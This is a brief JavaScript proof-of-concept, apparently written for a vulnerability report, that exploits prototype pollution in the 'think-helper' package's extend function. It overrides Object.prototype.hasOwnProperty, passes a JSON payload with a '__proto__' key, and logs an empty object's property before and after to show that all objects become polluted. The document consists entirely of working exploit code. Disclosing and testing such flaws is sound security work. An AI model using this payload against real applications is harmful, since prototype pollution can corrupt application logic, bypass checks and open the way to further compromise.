Object.prototype.hasOwnProperty = () => true;
const a = require('think-helper');
let obj = {};
console.log({}.polluted);
a.extend(obj, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
console.log({}.polluted);